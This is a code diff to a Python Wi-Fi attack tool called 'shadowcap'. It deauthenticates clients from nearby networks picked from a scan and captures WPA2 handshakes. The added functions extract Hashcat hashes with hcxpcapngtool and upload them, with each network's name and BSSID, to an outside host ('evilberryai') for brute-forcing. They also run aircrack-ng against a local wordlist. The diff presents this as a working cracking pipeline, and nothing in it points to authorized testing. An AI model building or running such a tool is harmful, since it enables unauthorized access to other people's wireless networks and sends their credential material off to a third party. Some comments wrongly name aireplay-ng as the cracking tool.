@@ -8,7 +8,6 @@ import requests
 from datetime import datetime
 from pathlib import Path
 from io import StringIO
-import socket
 
 # ── color ──────────────────────────────────────────────────────────────────────
 def _e(*c): return '\033[' + ';'.join(map(str, c)) + 'm'
@@ -357,6 +356,109 @@ def pbar_blocking(label, duration, width=36):
     show_cur()
 
 # ══════════════════════════════════════════════════════════════════════════════
+# NEW: PASSWORD CRACKING FUNCTION
+# ══════════════════════════════════════════════════════════════════════════════
+def crack_password(cap_path, bssid, essid):
+    """Attempt to crack captured handshake using aireplay-ng with test.txt wordlist"""
+    wordlist_path = BASE_DIR / 'test.txt'
+
+    if not wordlist_path.exists():
+        warn(f'wordlist missing → {wordlist_path}')
+        info('create test.txt with passwords to crack locally')
+        return False
+
+    section('🔓 LOCAL CRACKING')
+    info(f'ai replay-ng → {cap_path.name}')
+    info(f'wordlist → {wordlist_path} ({wordlist_path.stat().st_size/1024:.1f}KB)')
+    info(f'target → {CB(essid or "<hidden>")} {DM(bssid)}')
+    print()
+
+    try:
+        # aireplay-ng cracking command (note: aireplay-ng syntax for cracking)
+        cmd = [
+            'aircrack-ng',
+            '-w', str(wordlist_path),
+            '-e', essid or '',
+            '-b', bssid,
+            str(cap_path)
+        ]
+
+        info(f'running: {" ".join(cmd)}')
+        print()
+
+        # Run aircrack-ng with live output monitoring
+        proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1,
+            universal_newlines=True
+        )
+
+        cracked = False
+        password = None
+
+        # Monitor output for KEY FOUND
+        start_time = time.time()
+        while proc.poll() is None and (time.time() - start_time) < 45:
+            line = proc.stdout.readline()
+            if line:
+                print(f'  {line.strip()}')
+                sys.stdout.flush()
+
+                # Check for cracked password patterns
+                patterns = [
+                    r'KEY FOUND! \[ ([^\]]+) \]',
+                    r'password: ([^\s]+)',
+                    r'\[ ([^\]]+) \]',
+                    r'cracked: ([^\s]+)'
+                ]
+
+                for pattern in patterns:
+                    match = re.search(pattern, line, re.IGNORECASE)
+                    if match:
+                        password = match.group(1).strip()
+                        cracked = True
+                        print()
+                        ok(f'{GB("🎉 PASSWORD CRACKED! 🎉")}')
+                        print(f'{YB("PASSWORD:")} {GB(password)}')
+                        print(f'{YB("NETWORK: ")} {CB(essid or "<hidden>")}')
+                        print(f'{YB("BSSID:    ")} {DM(bssid)}')
+                        print()
+                        break
+                if cracked:
+                    break
+
+        # Cleanup process
+        try:
+            if proc.poll() is None:
+                proc.terminate()
+                proc.wait(timeout=3)
+        except:
+            try:
+                proc.kill()
+            except:
+                pass
+
+        if not cracked and password:
+            ok(f'{GB("PASSWORD CRACKED!")} → {YB(password)}')
+        elif not cracked:
+            warn('no password found in wordlist')
+            info(f'test.txt has {len(list(open(wordlist_path)))} lines')
+            info('add target password to test.txt and retry')
+
+        endsection()
+        return cracked
+
+    except FileNotFoundError:
+        err('aircrack-ng not found → sudo apt install aircrack-ng')
+    except Exception as e:
+        err(f'cracking failed: {str(e)[:60]}')
+        endsection()
+        return False
+
+# ══════════════════════════════════════════════════════════════════════════════
 # CORE LOGIC
 # ══════════════════════════════════════════════════════════════════════════════
 BASE_DIR = Path(__file__).parent.resolve()
@@ -468,7 +570,6 @@ def pick_target(aps):
         return None
 
     # Filter: only networks with Power >= -70 dBm (stronger or equal)
-    # We treat missing/invalid power as "unknown" and exclude them here
     strong_aps = []
     for ap in aps:
         power_val = ap.get('Power') or ap.get('pwr', None)
@@ -477,7 +578,7 @@ def pick_target(aps):
             if pwr_num >= -70:
                 strong_aps.append(ap)
         except (ValueError, TypeError):
-            pass  # skip invalid power values
+            pass
 
     if not strong_aps:
         print(f'\n {YL("No networks with good signal (≥ -70 dBm) found")}')
@@ -499,32 +600,173 @@ def pick_target(aps):
         idx = input(f'\n {DM("target")} {G("▸ ")}').strip()
         idx = int(idx) - 1
         if 0 <= idx < len(strong_aps):
-            return strong_aps[idx]          # return from filtered list
+            return strong_aps[idx]
     except:
         pass
     return None
-def check_hs(cap):
+
+# ══════════════════════════════════════════════════════════════════════════════
+# HANDSHAKE EXTRACTION + API UPLOAD
+# ══════════════════════════════════════════════════════════════════════════════
+def extract_and_upload_handshake(cap_path, bssid, essid, channel):
+    """Extract Hashcat .22000 hash using hcxpcapngtool and upload to API"""
+    section('HANDSHAKE → API')
+
+    if not cap_path.exists():
+        err('capture file missing')
+        endsection()
+        return False
+
+    # Target info for API
+    target_info = {
+        'essid': essid or '<hidden>',
+        'bssid': bssid,
+        'enc': 'WPA2',
+        'channel': channel or 0
+    }
+
+    info(f'extracting → {cap_path.name}')
+    info(f'target → {target_info}')
+
+    # Generate hash filename
+    hash_file = cap_path.with_suffix('.hc22000')
+
+    try:
+        # Extract handshake using hcxpcapngtool (Hashcat format)
+        cmd = [
+            'hcxpcapngtool',
+            '-o', str(hash_file),
+            str(cap_path)
+        ]
+
+        anim = Anim('spin', 'hcxpcapngtool extraction...')
+        anim.start()
+
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=25)
+        anim.stop()
+
+        if result.returncode != 0:
+            err(f'extraction failed: {result.stderr.strip()[:120]}')
+            endsection()
+            return False
+        if result.stderr and 'error' in result.stderr.lower():
+            warn(f'extractor stderr: {result.stderr.strip()[:120]}')
+
+        if not hash_file.exists() or hash_file.stat().st_size == 0:
+            err('no handshake found in capture')
+            endsection()
+            return False
+
+        # Read hash file
+        with open(hash_file, 'r', encoding='utf-8', errors='ignore') as f:
+            hash_content = f.read().strip()
+
+        if not hash_content:
+            err('empty hash file')
+            endsection()
+            return False
+
+        # Take first handshake (usually strongest)
+        first_hash = hash_content.split('\n')[0].strip()
+        if not first_hash:
+            err('no valid hash found')
+            endsection()
+            return False
+
+        ok(f'{GB("handshake extracted!")} → {len(first_hash)} chars')
+        info(f'hash preview: {first_hash[:64]}...')
+
+        # Upload to API
+        info('uploading → evilberryai...')
+        upload_data = {
+            **target_info,
+            'hash': first_hash
+        }
+
+        response = requests.post(
+            'https://evilberryai.vercel.app/api/hashvalue',
+            json=upload_data,
+            headers={'Content-Type': 'application/json'},
+            timeout=15
+        )
+
+        if response.status_code in [200, 201]:
+            data = response.json()
+            ok(f'{GB("✅ UPLOADED!")} ID: {data.get("data", {}).get("_id", "saved")}')
+            info(f'bruteforce: GET /api/bruteforce/{data.get("data", {}).get("_id")}')
+        else:
+            warn(f'API {response.status_code}: {response.text[:100]}')
+            info('hash saved locally for manual upload')
+
+        # Cleanup hash file (optional)
+        try: hash_file.unlink()
+        except: pass
+
+        endsection()
+        return True
+
+    except subprocess.TimeoutExpired:
+        err('extraction timeout')
+    except FileNotFoundError:
+        err('hcxpcapngtool not found → sudo apt install hcxtools')
+    except requests.exceptions.RequestException as e:
+        err(f'API error: {str(e)[:60]}')
+    except Exception as e:
+        err(f'unexpected: {str(e)[:60]}')
+
+    endsection()
+    return False
+
+def check_hs(cap, bssid=None, essid=None, channel=None):
     section('HANDSHAKE CHECK')
-    if not cap.exists(): err('capture file missing'); endsection(); return False
+    if not cap.exists():
+        err('capture file missing')
+        endsection()
+        return False
+
     info(f'aircrack-ng → {cap.name}')
     anim = Anim('spin', 'analyzing capture...')
     anim.start()
+
     try:
         r = subprocess.run(['aircrack-ng', str(cap)],
-                             capture_output=True, text=True, timeout=12)
+                           capture_output=True, text=True, timeout=12)
         anim.stop()
         out = (r.stdout + r.stderr).lower()
-        if '1 handshake' in out or 'handshake found' in out:
-            ok(GB('handshake captured!'))
-            info('hashcat -m 22000 capture.hc22000 rockyou.txt')
-            endsection(); return True
+
+        handshake_confirmed = '1 handshake' in out or 'handshake found' in out
+
+        if handshake_confirmed:
+            ok(GB('handshake confirmed!'))
+
+            # EXTRACT AND UPLOAD
+            handshake_extracted = extract_and_upload_handshake(cap, bssid, essid, channel)
+
+            # NEW: ATTEMPT LOCAL CRACKING WITH AIREPLAY-NG / AIRCRACK-NG
+            if handshake_extracted or handshake_confirmed:
+                crack_password(cap, bssid, essid)
+
+            endsection()
+            return True
+
         if 'no valid wpa' in out or '0 handshake' in out:
-            err('no handshake — pmf / no reconnect / signal')
-            endsection(); return False
-        warn('ambiguous — possible partial')
-        endsection(); return False
+            err('no handshake')
+            endsection()
+            return False
+
+        warn('aircrack ambiguous → trying hcxpcapngtool anyway')
+        # Still try extraction even if aircrack is unsure
+        handshake_extracted = extract_and_upload_handshake(cap, bssid, essid, channel)
+        if handshake_extracted:
+            crack_password(cap, bssid, essid)
+        endsection()
+        return False
+
     except Exception as e:
-        anim.stop(); err(str(e)); endsection(); return False
+        anim.stop()
+        err(str(e))
+        endsection()
+        return False
 
 def do_capture_deauth(mon, bssid, channel, essid):
     section('CAPTURE + DEAUTH')
@@ -557,8 +799,10 @@ def do_capture_deauth(mon, bssid, channel, essid):
     caps = list(BASE_DIR.glob(f'{pfx.stem}-01.cap'))
     if not caps: err('no capture generated'); endsection(); return
     ok(f'saved → {GD(caps[0].name)}')
+
+    # PASS TARGET INFO FOR EXTRACTION
+    check_hs(caps[0], bssid, essid, channel)
     endsection()
-    check_hs(caps[0])
 
 def do_deauth_only(mon, bssid, channel):
     section('DEAUTH')
@@ -750,6 +994,10 @@ def main():
     last_scan = None
     mon = None
 
+    print(f'{GB("shadowcap v4.20 - FULL WPA2 CRACK PIPELINE")}')
+    print(f'{YL("⚠️ ")} create test.txt wordlist in script directory')
+    print()
+
     while True:
         ch = menu()
         if ch == '1':
@@ -774,7 +1022,6 @@ def main():
             target = pick_target(aps)
             if not target: continue
             mon = mon or prepare_monitor('wlan1')
-            # FIXED: Use correct keys
             do_deauth_only(mon,
                           target.get('BSSID') or target.get('bssid'),
                           target.get('channel'))
@@ -788,7 +1035,6 @@ def main():
             target = pick_target(aps)
             if not target: continue
             mon = mon or prepare_monitor('wlan1')
-            # FIXED: Use correct keys
             do_capture_deauth(mon,
                              target.get('BSSID') or target.get('bssid'),
                              target.get('channel'),
